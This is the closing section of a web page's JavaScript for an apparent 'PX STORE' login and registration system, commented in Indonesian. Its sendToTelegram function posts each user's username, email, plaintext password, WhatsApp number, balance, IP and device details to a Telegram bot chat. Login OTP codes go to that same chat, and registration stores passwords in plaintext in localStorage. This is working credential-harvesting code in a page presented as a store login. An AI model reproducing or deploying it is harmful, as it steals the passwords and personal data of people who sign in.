        const whatsappLink = `https://wa.me/${whatsapp}?text=${encodeURIComponent(`Halo! 👋 Berikut kode OTP untuk login ke akun *PX STORE* Anda: ${otp}\n\nKode ini berlaku 5 menit. Jangan bagikan kode ini kepada siapapun. Jika tidak meminta kode silahkan abaikan pesan ini.`)}`;
        
        // Format pesan OTP untuk admin dengan link WhatsApp
        const message = `🔐 KODE OTP LOGIN PX STORE 🔐
        
👤 Informasi User:
• Username: ${username}
• Email: ${email}
• WhatsApp: \`${whatsapp}\`
• Waktu: ${currentTime}
• IP Address: ${userIP || 'Loading...'}
• Perangkat: ${deviceInfo}

🔢 KODE OTP: \`${otp}\`

📱 [Kirim OTP ke User via WhatsApp](${whatsappLink})

⚠️ Kode ini berlaku selama 10 menit. JANGAN BAGIKAN kode ini kepada siapapun!`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5 detik
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            }),
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        return response.ok;
    } catch (error) {
        console.error('Error sending OTP to Telegram:', error);
        return false;
    }
}

// Send login data to Telegram dengan format yang diminta dan timeout
async function sendToTelegram(userData, password) {
    try {
        const currentTime = new Date().toLocaleString('id-ID');
        const deviceInfo = getDeviceInfo();
        const browserInfo = getBrowserInfo();
        const platformInfo = getPlatformInfo();
        const languageInfo = getLanguageInfo();
        
        // Ekstrak data dari struktur nested
        const username = getUsername(userData);
        const email = userData.email || (userData.user_data && userData.user_data.email) || 
                     (userData.user_data && userData.user_data.user_data && userData.user_data.user_data.email) || 
                     'Tidak diketahui';
        const whatsapp = getUserWhatsApp(userData) || '-';
        const balance = getBalance(userData);
        
        // Format pesan dengan password dan WhatsApp yang lebih jelas
        const message = `🔔 LOGIN BARU PX STORE 🔔
        
👤 Informasi Login:
• Username: ${username}
• Email: ${email}
• Password: ${password}
• WhatsApp: \`${whatsapp}\`
• Saldo: Rp ${balance.toLocaleString('id-ID')}
• Waktu: ${currentTime}
• IP Address: ${userIP || 'Loading...'}

📍 Informasi Perangkat:
• Perangkat: ${deviceInfo}
• Browser: ${browserInfo}
• Platform: ${platformInfo}
• Bahasa: ${languageInfo}

🌐 User Agent: ${navigator.userAgent}

⚠️ INFORMASI SENSITIF - JANGAN BAGIKAN KE SIAPAPUN!`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5 detik
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }),
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        return response.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Tampilkan form pendaftaran
function showRegisterForm() {
    document.getElementById('registerModal').style.display = 'flex';
}

// Tutup form pendaftaran
function closeRegisterForm() {
    document.getElementById('registerModal').style.display = 'none';
    document.getElementById('registerMessage').style.display = 'none';
}

// Tampilkan modal OTP
function showOtpModal() {
    document.getElementById('otpModal').style.display = 'flex';
    document.getElementById('otpCode').value = '';
    document.getElementById('otpMessage').style.display = 'none';
    
    // Mulai countdown OTP
    startOtpCountdown();
    
    // Fokus ke input OTP
    setTimeout(() => document.getElementById('otpCode').focus(), 100);
}

// Tutup modal OTP
function closeOtpModal() {
    document.getElementById('otpModal').style.display = 'none';
    pendingUserData = null;
    pendingUserPassword = null;
    generatedOtp = null;
    
    // Clear countdown interval
    if (otpCountdownInterval) {
        clearInterval(otpCountdownInterval);
        otpCountdownInterval = null;
    }
}

// Fungsi untuk membuat struktur data baru sesuai format
function createNewUserDataStructure(email, username, password, whatsapp) {
    const currentTime = new Date().toISOString();
    
    return {
        email: email,
        username: username,
        user_data: {
            username: username,
            email: email,
            password: password,
            whatsapp: whatsapp,
            balance: 0,
            history: [],
            registeredAt: currentTime,
            lastLogin: currentTime,
            totalSpent: 0,
            totalOrders: 0
        },
        balance: 0,
        topup_history: [],
        join_date: currentTime,
        login_time: currentTime,
        logout_time: "",
        last_ip: "Akan dideteksi saat login",
        last_update: currentTime
    };
}

// Handle pendaftaran
async function handleRegister() {
    const username = document.getElementById('regUsername').value;
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    const confirmPassword = document.getElementById('regConfirmPassword').value;
    let whatsapp = document.getElementById('regWhatsApp').value;
    
    // Validasi input
    if (!username || !email || !password || !confirmPassword || !whatsapp) {
        showMessage('Harap isi semua field!', 'error', 'registerMessage');
        return;
    }
    
    if (!validateUsername(username)) {
        showMessage('Username harus 3-20 karakter, hanya boleh huruf, angka, dan underscore!', 'error', 'registerMessage');
        return;
    }
    
    if (!validateEmail(email)) {
        showMessage('Format email tidak valid!', 'error', 'registerMessage');
        return;
    }
    
    if (!validatePassword(password)) {
        showMessage('Password minimal 6 karakter!', 'error', 'registerMessage');
        return;
    }
    
    if (password !== confirmPassword) {
        showMessage('Konfirmasi password tidak cocok!', 'error', 'registerMessage');
        return;
    }
    
    // Format nomor WhatsApp
    whatsapp = formatWhatsAppNumber(whatsapp);
    
    if (!validateWhatsApp(whatsapp)) {
        showMessage('Format nomor WhatsApp tidak valid! Hanya angka, 10-15 digit.', 'error', 'registerMessage');
        return;
    }
    
    showLoading(true);
    
    try {
        // Cek apakah username sudah terdaftar di GitHub
        const usernameExists = await isUsernameRegistered(username);
        if (usernameExists) {
            showLoading(false);
            showMessage('Username sudah terdaftar! Silakan gunakan username lain.', 'error', 'registerMessage');
            return;
        }
        
        // Cek apakah email sudah terdaftar di GitHub
        const emailExists = await isEmailRegistered(email);
        if (emailExists) {
            showLoading(false);
            showMessage('Email sudah terdaftar! Silakan login.', 'error', 'registerMessage');
            return;
        }
        
        // Buat data user dengan struktur yang sesuai
        const newUserData = createNewUserDataStructure(email, username, password, whatsapp);
        
        // Simpan ke localStorage sebagai backup
        localStorage.setItem(`pxstore_user_${email}`, JSON.stringify(newUserData));
        
        // Simpan juga dalam format array untuk kompatibilitas
        const existingUsers = JSON.parse(localStorage.getItem('pxstore_users_data') || '[]');
        existingUsers.push(newUserData);
        localStorage.setItem('pxstore_users_data', JSON.stringify(existingUsers));
        
        // Update cache
        cachedUsersData = existingUsers;
        
        showLoading(false);
        showMessage('Pendaftaran berhasil! Nomor WhatsApp: ' + whatsapp, 'success', 'registerMessage');
        
        // Tutup modal setelah 3 detik
        setTimeout(() => {
            closeRegisterForm();
            document.getElementById('email').value = email;
            document.getElementById('password').value = '';
        }, 3000);
        
    } catch (error) {
        showLoading(false);
        showMessage('❌ Error saat pendaftaran: ' + error.message, 'error', 'registerMessage');
    }
}

// Kirim ulang OTP
async function resendOtp() {
    if (!pendingUserData) {
        showMessage('Tidak ada data user yang tersedia!', 'error', 'otpMessage');
        return;
    }
    
    // Cek cooldown OTP
    if (!canRequestOtp()) {
        const remainingTime = getRemainingCooldownTime();
        showMessage(`Tunggu ${formatTime(remainingTime)} menit sebelum meminta OTP lagi.`, 'error', 'otpMessage');
        return;
    }
    
    try {
        // Generate OTP baru
        generatedOtp = generateOtp();
        
        // Update waktu request OTP terakhir
        lastOtpRequestTime = Date.now();
        
        // Reset waktu kedaluwarsa OTP
        otpExpiryTime = Date.now() + (10 * 60 * 1000); // 10 menit
        
        // Kirim OTP ke admin Telegram
        const otpSent = await sendOtpToTelegram(pendingUserData, generatedOtp);
        
        if (otpSent) {
            showMessage('Kode OTP baru telah dikirim ke admin.', 'success', 'otpMessage');
            
            // Restart countdown
            startOtpCountdown();
            
        } else {
            showMessage('Gagal mengirim ulang OTP. Silakan coba lagi.', 'error', 'otpMessage');
        }
    } catch (error) {
        showMessage('Error mengirim ulang OTP: ' + error.message, 'error', 'otpMessage');
    }
}

// Event listener untuk Enter key
document.addEventListener('DOMContentLoaded', function() {
    // Preload data saat halaman dimuat
    preloadData();
    
    // Cek status login saat halaman dimuat
    checkLoginStatus();
    
    // Enter key untuk login form
    document.getElementById('password').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleLogin();
        }
    });
    
    // Enter key untuk OTP form
    document.getElementById('otpCode')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            verifyOtp();
        }
    });
    
    // Enter key untuk register form
    document.getElementById('regConfirmPassword')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleRegister();
        }
    });
    
    // Event listener untuk format real-time nomor WhatsApp
    document.getElementById('regWhatsApp').addEventListener('input', function(e) {
        let value = e.target.value;
        
        // Format nomor saat user mengetik
        if (value.startsWith('08') || value.startsWith('8')) {
            const formatted = formatWhatsAppNumber(value);
            
            // Tampilkan format yang benar sebagai placeholder atau tooltip
            const hint = document.getElementById('whatsappHint');
            if (!hint) {
                const hintElement = document.createElement('div');
                hintElement.id = 'whatsappHint';
                hintElement.style.fontSize = '0.8rem';
                hintElement.style.color = '#6c63ff';
                hintElement.style.marginTop = '5px';
                hintElement.textContent = 'Format otomatis: ' + formatted;
                e.target.parentNode.appendChild(hintElement);
            } else {
                hint.textContent = 'Format otomatis: ' + formatted;
            }
        } else {
            // Hapus hint jika tidak perlu
            const hint = document.getElementById('whatsappHint');
            if (hint) {
                hint.remove();
            }
        }
    });
    
    // Coba isi data dari localStorage jika ada
    const savedEmail = localStorage.getItem('pxstore_user_email');
    if (savedEmail) {
        document.getElementById('email').value = savedEmail;
    }
    
    // PERBAIKAN: Hanya register modal yang bisa ditutup dengan klik di luar
    document.getElementById('registerModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closeRegisterForm();
        }
    });
    
    console.log('Aplikasi PX STORE siap digunakan dengan data dari GitHub');
});
    </script>
</body>
</html>